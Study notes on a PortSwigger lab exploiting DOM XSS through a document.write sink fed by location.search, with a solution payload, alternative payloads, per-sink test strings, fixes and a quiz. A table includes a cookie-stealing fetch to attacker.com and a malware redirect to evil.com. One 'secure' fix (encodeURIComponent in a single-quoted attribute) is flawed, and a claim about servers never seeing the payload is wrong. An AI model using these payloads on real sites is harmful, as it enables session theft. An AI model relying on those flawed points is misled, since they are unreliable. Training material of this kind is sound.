# DOM XSS in `document.write` Sink Using Source `location.search`

## 📝 Lab Notes for Revision

---

# 1. Lab Overview

| Detail         | Information                                                     |
| -------------- | --------------------------------------------------------------- |
| **Lab Name**   | DOM XSS in `document.write` sink using source `location.search` |
| **Platform**   | PortSwigger Web Security Academy                                |
| **Difficulty** | APPRENTICE                                                      |
| **XSS Type**   | DOM-based Cross-Site Scripting                                  |

---

# 2. What is This Vulnerability?

## Definition

DOM-based XSS vulnerability where the `document.write` function writes data from `location.search` directly to the page without any sanitization or encoding.

## Affected Components

| Component         | Role                                  |
| ----------------- | ------------------------------------- |
| `location.search` | Reads data from URL query string      |
| `document.write`  | Writes data directly to HTML document |

## Vulnerable Code Example

```javascript
var query = location.search.substring(1);

document.write(
  "<img src='/resources/images/tracker.gif?searchTerms=" + query + "'>"
);
```

---

# 3. Why This is Dangerous

## Attack Flow Diagram

```text
User Clicks Malicious Link
         ↓
URL contains payload in ?search= parameter
         ↓
location.search reads the payload
         ↓
document.write writes payload to page
         ↓
Browser executes malicious JavaScript
         ↓
Attacker achieves: Cookie theft, session hijacking, etc.
```

## Real-World Impact

| Attack          | Payload Example                                    | Consequence           |
| --------------- | -------------------------------------------------- | --------------------- |
| Cookie Stealing | `fetch('https://attacker.com?c='+document.cookie)` | Account takeover      |
| Keylogging      | `document.addEventListener('keypress',...)`        | Password theft        |
| Phishing        | `document.body.innerHTML=...`                      | Credential harvesting |
| Malware         | `window.location='evil.com/virus.exe'`             | System compromise     |
| Defacement      | `document.body.innerHTML='Hacked'`                 | Reputation damage     |

---

# 4. How to Exploit (Step by Step)

## Step 1: Identify the Vulnerability

* Enter random string in search box (e.g., `test123`)
* Right-click → **Inspect Element**
* Observe that your input appears inside an `img src` attribute

```html
<img src="/resources/images/tracker.gif?searchTerms=test123">
```

---

## Step 2: Understand the Context

Your input is inside:

```html
src="..."
```

Need to:

1. Break out of the attribute
2. Close the tag
3. Inject malicious HTML/JavaScript

---

## Step 3: Craft the Payload

```html
"><svg onload=alert(1)>
```

---

## Step 4: Payload Breakdown

| Character               | Purpose               | Explanation                 |
| ----------------------- | --------------------- | --------------------------- |
| `"`                     | Close `src` attribute | Ends `src="..."`            |
| `>`                     | Close `img` tag       | Ends the `<img>` element    |
| `<svg onload=alert(1)>` | Inject SVG            | Executes JavaScript on load |

---

## Step 5: URL Construction

```text
https://YOUR-LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
```

---

## Step 6: Execute

* Paste malicious URL in browser
* Press Enter
* Alert popup appears ✅
* Lab solved

---

# 5. Alternative Payloads

## Working Payloads

```html
"><img src=x onerror=alert(1)>
```

```html
"><body onload=alert(1)>
```

```html
"><script>alert(1)</script>
```

```html
" onerror=alert(1) src=x
```

---

## Payloads for Different Contexts

| Context           | Payload                         |
| ----------------- | ------------------------------- |
| Inside attribute  | `" onmouseover=alert(1) "`      |
| Inside JavaScript | `"; alert(1); var x="`          |
| Inside HTML tag   | `><img src=x onerror=alert(1)>` |

---

# 6. Code Analysis (Vulnerable vs Secure)

## Vulnerable Code ❌

```javascript
// No encoding - DANGEROUS!
var searchTerm = location.search.split('=')[1];

document.write("<img src='/track?q=" + searchTerm + "'>");
```

### Why Dangerous?

Attacker can inject:

```html
"><script>...</script>
```

and break out of the attribute.

---

## Secure Code ✅

### Method 1: Use `textContent`

```javascript
var searchTerm = location.search.split('=')[1];

document.getElementById("output").textContent = searchTerm;
```

---

### Method 2: Encode Output

```javascript
var searchTerm = location.search.split('=')[1];

var encoded = encodeURIComponent(searchTerm);

document.write("<img src='/track?q=" + encoded + "'>");
```

---

### Method 3: Create Elements Safely

```javascript
var searchTerm = location.search.split('=')[1];

var img = new Image();

img.src = '/track?q=' + encodeURIComponent(searchTerm);

document.body.appendChild(img);
```

---

### Method 4: Use DOMPurify

```javascript
var searchTerm = location.search.split('=')[1];

document.write(
  DOMPurify.sanitize("<img src='/track?q=" + searchTerm + "'>")
);
```

---

# 7. Testing Methodology

## Manual Testing Checklist

```text
[ ] Find reflected input
[ ] Check HTML/attribute context
[ ] Try breaking out using quotes
[ ] Inject alert(1)
[ ] Try event handlers if blocked
[ ] Document findings
```

---

## Test Strings for Different Sinks

| Sink             | Test String                    |
| ---------------- | ------------------------------ |
| `document.write` | `"><svg onload=alert(1)>`      |
| `innerHTML`      | `<img src=x onerror=alert(1)>` |
| `eval()`         | `alert(1)`                     |
| `setTimeout()`   | `alert(1)`                     |
| `location.href`  | `javascript:alert(1)`          |

---

# 8. Key Concepts to Remember

## Important Terminology

| Term       | Definition                               |
| ---------- | ---------------------------------------- |
| Source     | Where user input comes from              |
| Sink       | Where data is written                    |
| DOM XSS    | XSS occurring entirely in client-side JS |
| Taint Flow | Path from source to sink                 |

---

## Why DOM XSS is Unique

* Server never sees the payload
* WAF cannot detect easily
* Logs may not show attack
* Client-side protection required

---

## Common Sources

| Source              | Data         |
| ------------------- | ------------ |
| `location.search`   | Query string |
| `location.hash`     | Fragment     |
| `location.href`     | Full URL     |
| `document.referrer` | Previous URL |
| `document.cookie`   | Cookies      |

---

# 9. Prevention Cheat Sheet

## DO's ✅

| Practice          | Example                           |
| ----------------- | --------------------------------- |
| Use `textContent` | `element.textContent = userInput` |
| Encode output     | `encodeURIComponent(userInput)`   |
| Safe DOM methods  | `createElement()`                 |
| Use CSP           | `script-src 'self'`               |
| Validate input    | Whitelist allowed chars           |

---

## DON'Ts ❌

| Dangerous Practice          | Why                   |
| --------------------------- | --------------------- |
| `document.write(userInput)` | Direct HTML injection |
| `innerHTML = userInput`     | XSS risk              |
| `eval(userInput)`           | JavaScript injection  |
| `location.href = userInput` | JS protocol injection |

---

# 10. Quick Revision Quiz

## Q1: Which function is the sink?

**Answer:** `document.write`

---

## Q2: What is the source?

**Answer:** `location.search`

---

## Q3: Why use SVG payload?

**Answer:** Need to break out of the `src` attribute and inject executable HTML.

---

## Q4: Can WAF detect DOM XSS?

**Answer:** Usually no, because payload executes client-side.

---

## Q5: Safe alternatives to `document.write`?

1. `textContent`
2. `createElement()`

---

# 11. Lab Solution Summary

```text
https://LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
```

---

# 12. Key Takeaways

* DOM XSS executes in browser
* `document.write` is dangerous
* `location.search` is user-controlled
* Context matters in payload crafting
* Break out before injecting
* Use safe DOM APIs
* Encoding is essential

---

# 13. Further Practice Resources

| Platform    | Focus                |
| ----------- | -------------------- |
| PortSwigger | DOM XSS labs         |
| XSS Game    | DOM XSS challenges   |
| TryHackMe   | Interactive practice |

---
